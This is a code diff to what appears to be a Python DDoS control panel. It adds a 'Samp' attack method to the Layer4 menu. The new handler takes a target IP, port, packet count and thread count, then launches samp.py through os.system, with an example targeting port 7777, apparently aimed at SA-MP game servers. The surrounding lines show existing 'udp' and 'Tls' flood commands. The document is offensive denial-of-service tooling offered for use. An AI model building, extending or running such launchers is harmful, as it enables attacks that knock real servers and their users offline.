@@ -111,7 +111,7 @@ def Layer4():
 	print('''
                \x1b[38;2;59;241;250m ソ\033[94mニ\x1b[38;2;224;0;142mッ\x1b[38;2;224;0;042m・\x1b[38;2;124;0;342mクパ・ネルMethods.                                    
             \033[94m—   \x1b[38;2;0;255;189mUdp  \033[94m  — \033[92m  Null   \033[94m —   \033[93mNull    
-            \033[94m—   \x1b[38;2;0;255;189mNull \033[94m  — \033[92m  Null  \033[94m  —   \033[93mNull 
+            \033[94m—   \x1b[38;2;0;255;189mSamp \033[94m  — \033[92m  Null  \033[94m  —   \033[93mNull 
             \033[94m—   \x1b[38;2;0;255;189mNull \033[94m  — \033[92m  Null   \033[94m —   \033[93mNull     
             \033[94m—   \x1b[38;2;0;255;189mNull \033[94m  — \033[92m  Null   \033[94m —   \033[93mNull     
             \033[94m—   \x1b[38;2;0;255;189mNull \033[94m  — \033[92m  Null   \033[94m —   \033[93mNull       
@@ -148,6 +148,17 @@ def main():
               except IndexError:
                     print("Usage : udp <ip> <port> <packet> <threads> <times>")
                     print("Example : udp 127.0.0.1:53 60")
+        elif "Samp" in cnc:
+              try:
+                    ip=cnc.split()[1]
+                    port=cnc.split()[2]
+                    choice=cnc.split()[3]
+                    times=cnc.split()[4]
+                    threads=cnc.split()[5]
+                    os.system(f"python samp.py {ip} {port} {choice} {times} {threads}")
+              except IndexError:
+                    print("Usage : Samp <ip> <port> <choice (y)> <packet> <threads>")
+                    print("Example : Samp 127.0.0.1 7777 y 1000 1000")
 #layer7
         elif "Tls" in cnc:
               try:
